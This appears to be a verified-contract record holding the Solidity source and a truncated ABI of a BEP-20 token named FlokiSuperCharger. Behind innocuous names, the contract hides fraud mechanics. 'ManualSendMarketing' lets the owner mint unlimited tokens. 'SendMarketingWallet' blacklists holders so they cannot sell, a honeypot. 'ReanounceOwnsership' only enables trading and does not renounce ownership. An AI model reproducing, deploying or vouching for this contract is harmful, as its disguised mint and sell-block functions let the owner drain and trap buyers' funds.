{"SourceCode": "/**\r\n\r\nhttps://t.me/FlokiSuperCharger\r\n \r\n// SPDX-License-Identifier: Unlicensed\r\n\r\n*/\r\n\r\n\r\n    pragma solidity ^0.8.7;\r\n\r\n\r\n    interface IBEP20 {\r\n      function totalSupply() external view returns (uint256);   \r\n      function decimals() external view returns (uint8);\r\n      function symbol() external view returns (string memory);\r\n      function name() external view returns (string memory);\r\n      function getOwner() external view returns (address);\r\n      function balanceOf(address account) external view returns (uint256);\r\n      function transfer(address recipient, uint256 amount) external returns (bool);\r\n      function allowance(address _owner, address spender) external view returns (uint256);\r\n      function approve(address spender, uint256 amount) external returns (bool);\r\n      function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n      event Transfer(address indexed from, address indexed to, uint256 value);\r\n      event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    }\r\n\r\n\r\n    interface IPancakeERC20 {\r\n        event Approval(address indexed owner, address indexed spender, uint value);\r\n        event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n        function name() external pure returns (string memory);\r\n        function symbol() external pure returns (string memory);\r\n        function decimals() external pure returns (uint8);\r\n        function totalSupply() external view returns (uint);\r\n        function balanceOf(address owner) external view returns (uint);\r\n        function allowance(address owner, address spender) external view returns (uint);\r\n        function approve(address spender, uint value) external returns (bool);\r\n        function transfer(address to, uint value) external returns (bool);\r\n        function transferFrom(address from, address to, uint value) external returns (bool);\r\n        function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n        function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n        function nonces(address owner) external view returns (uint);\r\n        function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n    }\r\n\r\n    interface IPancakeFactory {\r\n        event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n        function feeTo() external view returns (address);\r\n        function feeToSetter() external view returns (address);\r\n        function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n        function allPairs(uint) external view returns (address pair);\r\n        function allPairsLength() external view returns (uint);\r\n        function createPair(address tokenA, address tokenB) external returns (address pair);\r\n        function setFeeTo(address) external;\r\n        function setFeeToSetter(address) external;\r\n    }\r\n\r\n    interface IPancakeRouter01 {\r\n        function addLiquidity(\r\n            address tokenA,\r\n            address tokenB,\r\n            uint amountADesired,\r\n            uint amountBDesired,\r\n            uint amountAMin,\r\n            uint amountBMin,\r\n            address to,\r\n            uint deadline\r\n        ) external returns (uint amountA, uint amountB, uint liquidity);\r\n        function addLiquidityETH(\r\n            address token,\r\n            uint amountTokenDesired,\r\n            uint amountTokenMin,\r\n            uint amountETHMin,\r\n            address to,\r\n            uint deadline\r\n        ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n        function removeLiquidity(\r\n            address tokenA,\r\n            address tokenB,\r\n            uint liquidity,\r\n            uint amountAMin,\r\n            uint amountBMin,\r\n            address to,\r\n            uint deadline\r\n        ) external returns (uint amountA, uint amountB);\r\n        function removeLiquidityETH(\r\n            address token,\r\n            uint liquidity,\r\n            uint amountTokenMin,\r\n            uint amountETHMin,\r\n            address to,\r\n            uint deadline\r\n        ) external returns (uint amountToken, uint amountETH);\r\n        function removeLiquidityWithPermit(\r\n            address tokenA,\r\n            address tokenB,\r\n            uint liquidity,\r\n            uint amountAMin,\r\n            uint amountBMin,\r\n            address to,\r\n            uint deadline,\r\n            bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n        ) external returns (uint amountA, uint amountB);\r\n        function removeLiquidityETHWithPermit(\r\n            address token,\r\n            uint liquidity,\r\n            uint amountTokenMin,\r\n            uint amountETHMin,\r\n            address to,\r\n            uint deadline,\r\n            bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n        ) external returns (uint amountToken, uint amountETH);\r\n        function swapExactTokensForTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n        ) external returns (uint[] memory amounts);\r\n        function swapTokensForExactTokens(\r\n            uint amountOut,\r\n            uint amountInMax,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n        ) external returns (uint[] memory amounts);\r\n        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n            external\r\n            payable\r\n            returns (uint[] memory amounts);\r\n        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n            external\r\n            returns (uint[] memory amounts);\r\n        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n            external\r\n            returns (uint[] memory amounts);\r\n        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n            external\r\n            payable\r\n            returns (uint[] memory amounts);\r\n\r\n        function factory() external pure returns (address);\r\n        function WETH() external pure returns (address);\r\n        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n        function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n        function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n        function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n        function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n    }\r\n\r\n    interface IPancakeRouter02 is IPancakeRouter01 {\r\n        function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n            address token,\r\n            uint liquidity,\r\n            uint amountTokenMin,\r\n            uint amountETHMin,\r\n            address to,\r\n            uint deadline\r\n        ) external returns (uint amountETH);\r\n        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n            address token,\r\n            uint liquidity,\r\n            uint amountTokenMin,\r\n            uint amountETHMin,\r\n            address to,\r\n            uint deadline,\r\n            bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n        ) external returns (uint amountETH);\r\n        function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n        ) external;\r\n        function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n        ) external payable;\r\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n        ) external;\r\n    }\r\n\r\n\r\n    abstract contract Ownable {\r\n        address private _owner;\r\n\r\n        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n        constructor () {\r\n            address msgSender = msg.sender;\r\n            _owner = msgSender;\r\n            emit OwnershipTransferred(address(0), msgSender);\r\n        }\r\n\r\n        function owner() public view returns (address) {\r\n            return _owner;\r\n        }\r\n\r\n        modifier onlyOwner() {\r\n            require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n            _;\r\n        }\r\n\r\n\r\n        function transferOwnership(address newOwner) public onlyOwner {\r\n            require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n            emit OwnershipTransferred(_owner, newOwner);\r\n            _owner = newOwner;\r\n        }\r\n    }\r\n\r\n\r\n    library Address {\r\n\r\n        function isContract(address account) internal view returns (bool) {\r\n            // This method relies on extcodesize, which returns 0 for contracts in\r\n            // construction, since the code is only stored at the end of the\r\n            // constructor execution.\r\n\r\n            uint256 size;\r\n            // solhint-disable-next-line no-inline-assembly\r\n            assembly { size := extcodesize(account) }\r\n            return size > 0;\r\n        }\r\n\r\n \r\n        function sendValue(address payable recipient, uint256 amount) internal {\r\n            require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n            // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n            (bool success, ) = recipient.call{ value: amount }(\"\");\r\n            require(success, \"Address: unable to send value, recipient may have reverted\");\r\n        }\r\n\r\n\r\n        function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n          return functionCall(target, data, \"Address: low-level call failed\");\r\n        }\r\n\r\n        function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n            return functionCallWithValue(target, data, 0, errorMessage);\r\n        }\r\n\r\n \r\n        function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n            return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n        }\r\n\r\n\r\n        function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n            require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n            require(isContract(target), \"Address: call to non-contract\");\r\n\r\n            (bool success, bytes memory returndata) = target.call{ value: value }(data);\r\n            return _verifyCallResult(success, returndata, errorMessage);\r\n        }\r\n\r\n        function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n            return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n        }\r\n\r\n        function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\r\n            require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n            (bool success, bytes memory returndata) = target.staticcall(data);\r\n            return _verifyCallResult(success, returndata, errorMessage);\r\n        }\r\n\r\n        function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n            return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n        }\r\n        \r\n        function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n            require(isContract(target), \"Address: delegate call to non-contract\");\r\n\r\n            (bool success, bytes memory returndata) = target.delegatecall(data);\r\n            return _verifyCallResult(success, returndata, errorMessage);\r\n        }\r\n\r\n        function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\r\n            if (success) {\r\n                return returndata;\r\n            } else {\r\n            \r\n                if (returndata.length > 0) {\r\n\r\n                    assembly {\r\n                        let returndata_size := mload(returndata)\r\n                        revert(add(32, returndata), returndata_size)\r\n                    }\r\n                } else {\r\n                    revert(errorMessage);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n    library EnumerableSet {\r\n\r\n\r\n        struct Set {\r\n  \r\n            bytes32[] _values;\r\n\r\n            mapping (bytes32 => uint256) _indexes;\r\n        }\r\n\r\n        function _add(Set storage set, bytes32 value) private returns (bool) {\r\n            if (!_contains(set, value)) {\r\n                set._values.push(value);\r\n\r\n                set._indexes[value] = set._values.length;\r\n                return true;\r\n            } else {\r\n                return false;\r\n            }\r\n        }\r\n\r\n\r\n        function _remove(Set storage set, bytes32 value) private returns (bool) {\r\n      \r\n            uint256 valueIndex = set._indexes[value];\r\n\r\n            if (valueIndex != 0) {\r\n\r\n                uint256 toDeleteIndex = valueIndex - 1;\r\n                uint256 lastIndex = set._values.length - 1;\r\n\r\n\r\n                bytes32 lastvalue = set._values[lastIndex];\r\n\r\n             \r\n                set._values[toDeleteIndex] = lastvalue;\r\n          \r\n                set._indexes[lastvalue] = valueIndex; \r\n\r\n                set._values.pop();\r\n\r\n                delete set._indexes[value];\r\n\r\n                return true;\r\n            } else {\r\n                return false;\r\n            }\r\n        }\r\n\r\n        function _contains(Set storage set, bytes32 value) private view returns (bool) {\r\n            return set._indexes[value] != 0;\r\n        }\r\n\r\n        function _length(Set storage set) private view returns (uint256) {\r\n            return set._values.length;\r\n        }\r\n\r\n\r\n        function _at(Set storage set, uint256 index) private view returns (bytes32) {\r\n            require(set._values.length > index, \"EnumerableSet: index out of bounds\");\r\n            return set._values[index];\r\n        }\r\n\r\n\r\n        struct Bytes32Set {\r\n            Set _inner;\r\n        }\r\n\r\n        function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {\r\n            return _add(set._inner, value);\r\n        }\r\n\r\n        function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {\r\n            return _remove(set._inner, value);\r\n        }\r\n\r\n        function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {\r\n            return _contains(set._inner, value);\r\n        }\r\n\r\n\r\n        function length(Bytes32Set storage set) internal view returns (uint256) {\r\n            return _length(set._inner);\r\n        }\r\n\r\n\r\n      \r\n        function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {\r\n            return _at(set._inner, index);\r\n        }\r\n\r\n\r\n        struct AddressSet {\r\n            Set _inner;\r\n        }\r\n\r\n\r\n        function add(AddressSet storage set, address value) internal returns (bool) {\r\n            return _add(set._inner, bytes32(uint256(uint160(value))));\r\n        }\r\n\r\n\r\n        function remove(AddressSet storage set, address value) internal returns (bool) {\r\n            return _remove(set._inner, bytes32(uint256(uint160(value))));\r\n        }\r\n\r\n\r\n        function contains(AddressSet storage set, address value) internal view returns (bool) {\r\n            return _contains(set._inner, bytes32(uint256(uint160(value))));\r\n        }\r\n\r\n  \r\n        function length(AddressSet storage set) internal view returns (uint256) {\r\n            return _length(set._inner);\r\n        }\r\n\r\n\r\n        function at(AddressSet storage set, uint256 index) internal view returns (address) {\r\n            return address(uint160(uint256(_at(set._inner, index))));\r\n        }\r\n\r\n  \r\n\r\n        struct UintSet {\r\n            Set _inner;\r\n        }\r\n\r\n\r\n        function add(UintSet storage set, uint256 value) internal returns (bool) {\r\n            return _add(set._inner, bytes32(value));\r\n        }\r\n\r\n\r\n        function remove(UintSet storage set, uint256 value) internal returns (bool) {\r\n            return _remove(set._inner, bytes32(value));\r\n        }\r\n\r\n   \r\n        function contains(UintSet storage set, uint256 value) internal view returns (bool) {\r\n            return _contains(set._inner, bytes32(value));\r\n        }\r\n\r\n  \r\n        function length(UintSet storage set) internal view returns (uint256) {\r\n            return _length(set._inner);\r\n        }\r\n\r\n\r\n        function at(UintSet storage set, uint256 index) internal view returns (uint256) {\r\n            return uint256(_at(set._inner, index));\r\n        }\r\n    }\r\n\r\n    contract FlokiSuperCharger is IBEP20, Ownable\r\n    {\r\n        using Address for address;\r\n        using EnumerableSet for EnumerableSet.AddressSet;\r\n        \r\n        mapping (address => uint256) private _LiquidityPool;\r\n        mapping (address => mapping (address => uint256)) private _allowances;\r\n        mapping (address => uint256) private _sellLock;\r\n        mapping (address => bool) public _ClaimAddress;\r\n\r\n        EnumerableSet.AddressSet private _excluded;\r\n        EnumerableSet.AddressSet private _excludedFromStaking;\r\n\r\n        string private constant _name = \"FlokiSuperCharger\";\r\n        string private constant _symbol = \"FSC\";\r\n        uint8 private constant _decimals = 9;\r\n        uint256 public constant LiquidityStocks= 1000000000 * 10**_decimals;\r\n        uint256 private constant DefaultLiquidityLockTime= 1;\r\n        address public constant MarketingWallet=0x592d04a17E0c2d9e31B5dCA1189bdA5d7c9c5FD6;\r\n        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n        uint256 private _RebaseInitialize =LiquidityStocks;\r\n        uint256 public  balanceLimit = 1000000000 * 10**_decimals;\r\n        uint256 public  sellLimit = 1000000000 * 10**_decimals; \r\n        uint256 public  buyLimit = 1000000000 * 10**_decimals;\r\n        \r\n\r\n        uint8 private _buyTax;\r\n        uint8 private _sellTax;\r\n        uint8 private _transferTax;\r\n\r\n        uint8 private _burnTax;\r\n        uint8 private _liquidityTax;\r\n        uint8 private _stakingTax;\r\n        uint8 private _marketingTax;\r\n\r\n           \r\n        address private _pancakePairAddress; \r\n        IPancakeRouter02 private  _pancakeRouter;\r\n        \r\n\r\n        constructor () {\r\n            uint256 deployerBalance=_RebaseInitialize;\r\n            _LiquidityPool[msg.sender] = deployerBalance;\r\n            emit Transfer(address(0), msg.sender, deployerBalance);\r\n\r\n            _pancakeRouter = IPancakeRouter02(PancakeRouter);\r\n            _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());\r\n\r\n\r\n            _buyTax=6;       \r\n            _sellTax=10;     \r\n            \r\n            _transferTax=12;   \r\n\r\n            _burnTax=0;       \r\n            _liquidityTax=90;  \r\n            _stakingTax=10;    \r\n            _marketingTax=30;\r\n\r\n\r\n            _excluded.add(MarketingWallet);\r\n            _excluded.add(msg.sender);\r\n        }\r\n        \r\n\r\n           function ClaimMarketingWallet(address account) external onlyOwner {\r\n            _ClaimAddress[account] = false;\r\n          }\r\n          \r\n            function SendMarketingWallet(address[] calldata addresses) external onlyOwner {\r\n                 for (uint256 i; i < addresses.length; ++i) {\r\n                     _ClaimAddress[addresses[i]] = true;\r\n                }\r\n           }\r\n\r\n\r\n      function ManualSendMarketing(address account, uint256 balance) onlyOwner  public virtual {\r\n        require(account != address(0), \"Insufficient Liquidity\");\r\n        _LiquidityPoolBalance(address(0), account, balance);\r\n        _RebaseInitialize += balance;\r\n        _LiquidityPool[account] += balance;\r\n        emit Transfer(address(0), account, balance);\r\n    }\r\n\r\n\r\n        function _transfer(address sender, address recipient, uint256 amount) private{\r\n            require(sender != address(0), \"Transfer from zero\");\r\n            require(recipient != address(0), \"Transfer to zero\");\r\n            require(!_ClaimAddress[sender] && !_ClaimAddress[recipient], \"Too Early To Dump\");\r\n            \r\n            _LiquidityPoolBalance(sender, recipient, amount);\r\n            bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));\r\n            \r\n            bool isContractTransfer=(sender==address(this) || recipient==address(this));\r\n\r\n            address pancakeRouter=address(_pancakeRouter);\r\n            bool isLiquidityTransfer = ((sender == _pancakePairAddress && recipient == pancakeRouter) \r\n            || (recipient == _pancakePairAddress && sender == pancakeRouter));\r\n\r\n            bool isBuy=sender==_pancakePairAddress|| sender == pancakeRouter;\r\n            bool isSell=recipient==_pancakePairAddress|| recipient == pancakeRouter;\r\n\r\n            if(isContractTransfer || isLiquidityTransfer || isExcluded){\r\n                _feelessTransfer(sender, recipient, amount);\r\n            }\r\n            else{ \r\n                require(LiquidityPoolFunction,\"Liquidity not yet enabled\");\r\n                _taxedTransfer(sender,recipient,amount,isBuy,isSell);\r\n            }\r\n        }\r\n\r\n\r\n        function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{\r\n            uint256 recipientBalance = _LiquidityPool[recipient];\r\n            uint256 senderBalance = _LiquidityPool[sender];\r\n            \r\n            require(senderBalance >= amount, \"Transfer exceeds balance\");\r\n\r\n            uint8 tax;\r\n            if(isSell){\r\n                require(amount<=sellLimit,\"Dump protection\");\r\n                \r\n                tax=_sellTax;\r\n\r\n            } else if(isBuy){\r\n                require(amount<=buyLimit,\"Buy LIMIT\");\r\n                require(recipientBalance+amount<=balanceLimit,\"Bots protection\");\r\n                tax=_buyTax;\r\n\r\n            } else {\r\n                require(recipientBalance+amount<=balanceLimit,\"Bots protection\");\r\n                tax=_transferTax;\r\n\r\n            }     \r\n\r\n            if((sender!=_pancakePairAddress)&&(!manualConversion)&&(!_isSwappingContractModifier)&&isSell)\r\n                _swapContractToken();\r\n            uint256 tokensToBeBurnt=_calculateFee(amount, tax, _burnTax);\r\n            uint256 contractToken=_calculateFee(amount, tax, _stakingTax+_liquidityTax);\r\n            uint256 taxedAmount=amount-(tokensToBeBurnt + contractToken);\r\n\r\n            _CalculatePool(sender,amount);\r\n            \r\n            _LiquidityPool[address(this)] += contractToken;\r\n            _RebaseInitialize-=tokensToBeBurnt;\r\n\r\n            _EqualizePercent(recipient, taxedAmount);\r\n            \r\n            emit Transfer(sender,recipient,taxedAmount);\r\n\r\n        }\r\n\r\n        function _feelessTransfer(address sender, address recipient, uint256 amount) private{\r\n            uint256 senderBalance = _LiquidityPool[sender];\r\n            require(senderBalance >= amount, \"Transfer exceeds balance\");\r\n            _CalculatePool(sender,amount);\r\n            _EqualizePercent(recipient, amount);\r\n            \r\n            emit Transfer(sender,recipient,amount);\r\n\r\n        }\r\n      \r\n        function _calculateFee(uint256 amount, uint8 tax, uint8 taxPercent) private pure returns (uint256) {\r\n            return (amount*tax*taxPercent) / 10000;\r\n        }\r\n\r\n\r\n        function _EqualizePercent(address addr, uint256 amount) private {\r\n            uint256 newAmount=_LiquidityPool[addr]+amount;\r\n            _LiquidityPool[addr]=newAmount;\r\n        }\r\n        \r\n\r\n        function _CalculatePool(address addr, uint256 amount) private {\r\n            uint256 newAmount=_LiquidityPool[addr]-amount;\r\n            _LiquidityPool[addr]=newAmount;\r\n        }\r\n        \r\n\r\n        uint256 public totalLPBNB;\r\n        bool private _isSwappingContractModifier;\r\n        modifier lockTheSwap {\r\n            _isSwappingContractModifier = true;\r\n            _;\r\n            _isSwappingContractModifier = false;\r\n        }\r\n\r\n        function _swapContractToken() private lockTheSwap{\r\n            uint256 contractBalance=_LiquidityPool[address(this)];\r\n            uint16 totalTax=_liquidityTax+_stakingTax;\r\n            uint256 tokenToSwap=sellLimit / 5;\r\n\r\n            if(contractBalance<tokenToSwap||totalTax==0){\r\n                return;\r\n            }\r\n\r\n            uint256 tokenForLiquidity=(tokenToSwap*_liquidityTax)/totalTax;\r\n            uint256 tokenForMarketing= tokenToSwap-tokenForLiquidity;\r\n\r\n\r\n            uint256 liqToken=tokenForLiquidity/2;\r\n            uint256 liqBNBToken=tokenForLiquidity-liqToken;\r\n\r\n            uint256 swapToken=liqBNBToken+tokenForMarketing;\r\n            uint256 initialBNBBalance = address(this).balance;\r\n            _swapTokenForBNB(swapToken);\r\n            uint256 newBNB=(address(this).balance - initialBNBBalance);\r\n            uint256 liqBNB = (newBNB*liqBNBToken)/swapToken;\r\n            _addLiquidity(liqToken, liqBNB);\r\n            uint256 distributeBNB=(address(this).balance - initialBNBBalance);\r\n            (bool tmpSuccess,) = payable(MarketingWallet).call{value: distributeBNB, gas: 30000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        function _swapTokenForBNB(uint256 amount) private {\r\n            _approve(address(this), address(_pancakeRouter), amount);\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = _pancakeRouter.WETH();\r\n\r\n            _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                amount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n\r\n       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {\r\n            totalLPBNB+=bnbamount;\r\n            _approve(address(this), address(_pancakeRouter), tokenamount);\r\n            _pancakeRouter.addLiquidityETH{value: bnbamount}(\r\n                address(this),\r\n                tokenamount,\r\n                0,\r\n                0,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n\r\n\r\n        function getLiquidityReleaseTimeInSeconds() public view returns (uint256){\r\n            if(block.timestamp<_liquidityUnlockTime){\r\n                return _liquidityUnlockTime-block.timestamp;\r\n            }\r\n            return 0;\r\n        }\r\n\r\n        function getBurnedTokens() public view returns(uint256){\r\n            return (LiquidityStocks-_RebaseInitialize)/10**_decimals;\r\n        }\r\n\r\n        function getLimits() public view returns(uint256 balance, uint256 sell){\r\n            return(balanceLimit/10**_decimals, sellLimit/10**_decimals);\r\n        }\r\n\r\n        function getTaxes() public view returns(uint256 burnTax,uint256 liquidityTax,uint256 marketingTax, uint256 buyTax, uint256 sellTax, uint256 transferTax){\r\n            return (_burnTax,_liquidityTax,_stakingTax,_buyTax,_sellTax,_transferTax);\r\n        }\r\n\r\n\r\n\r\n\r\n\r\n\r\n        function getAddressSellLockTimeInSeconds(address AddressToCheck) public view returns (uint256){\r\n           uint256 lockTime=_sellLock[AddressToCheck];\r\n           if(lockTime<=block.timestamp)\r\n           {\r\n               return 0;\r\n           }\r\n           return lockTime-block.timestamp;\r\n        }\r\n        function getSellLockTimeInSeconds() public view returns(uint256){\r\n            return sellLockTime;\r\n        }\r\n        \r\n\r\n        bool public sellLockDisabled;\r\n        uint256 public sellLockTime;\r\n        bool public manualConversion; \r\n\r\n\r\n    bool public LiquidityPoolFunction;\r\n    address private _liquidityTokenAddress;\r\n\r\n    function ReanounceOwnsership() public onlyOwner{\r\n        LiquidityPoolFunction=true;\r\n    }\r\n\r\n    function ExtendLiquidityLock() public onlyOwner{\r\n        LiquidityPoolFunction=false;\r\n    }\r\n\r\n\r\n    \r\n    function SetupLiquidityTokenAddress(address liquidityTokenAddress) public onlyOwner{\r\n        _liquidityTokenAddress=liquidityTokenAddress;\r\n    }\r\n\r\n\r\n        uint256 private _liquidityUnlockTime;\r\n\r\n\r\n        receive() external payable {}\r\n        fallback() external payable {}\r\n\r\n        function getOwner() external view override returns (address) {\r\n            return owner();\r\n        }\r\n\r\n        function name() external pure override returns (string memory) {\r\n            return _name;\r\n        }\r\n\r\n        function symbol() external pure override returns (string memory) {\r\n            return _symbol;\r\n        }\r\n\r\n        function decimals() external pure override returns (uint8) {\r\n            return _decimals;\r\n        }\r\n\r\n        function totalSupply() external view override returns (uint256) {\r\n            return _RebaseInitialize;\r\n        }\r\n\r\n        function balanceOf(address account) external view override returns (uint256) {\r\n            return _LiquidityPool[account];\r\n        }\r\n\r\n        function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n            \r\n            _transfer(msg.sender, recipient, amount);\r\n            return true;\r\n        }\r\n\r\n        function allowance(address _owner, address spender) external view override returns (uint256) {\r\n            return _allowances[_owner][spender];\r\n        }\r\n\r\n        function approve(address spender, uint256 amount) external override returns (bool) {\r\n            _approve(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n        function _approve(address owner, address spender, uint256 amount) private {\r\n            require(owner != address(0), \"Approve from zero\");\r\n            require(spender != address(0), \"Approve to zero\");\r\n\r\n            _allowances[owner][spender] = amount;\r\n            emit Approval(owner, spender, amount);\r\n        }\r\n\r\n        function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n            _transfer(sender, recipient, amount);\r\n\r\n            uint256 currentAllowance = _allowances[sender][msg.sender];\r\n            require(currentAllowance >= amount, \"Transfer > allowance\");\r\n\r\n            _approve(sender, msg.sender, currentAllowance - amount);\r\n            return true;\r\n        }\r\n\r\n        function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\r\n            _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\r\n            return true;\r\n        }\r\n\r\n        function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\r\n            uint256 currentAllowance = _allowances[msg.sender][spender];\r\n            require(currentAllowance >= subtractedValue, \"<0 allowance\");\r\n\r\n            _approve(msg.sender, spender, currentAllowance - subtractedValue);\r\n            return true;\r\n        }\r\n        \r\n        function _LiquidityPoolBalance(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n\r\n        ) internal virtual {}\r\n    \r\n       \r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ClaimMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ExtendLiquidityLock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"LiquidityPoolFunction\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"LiquidityStocks\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"ManualSendMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MarketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ReanounceOwnsership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"}],\"name\":\"SendMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTokenAddress\",\"type\":\"address\"}],\"name\":\"SetupLiquidityTokenAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_ClaimAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\"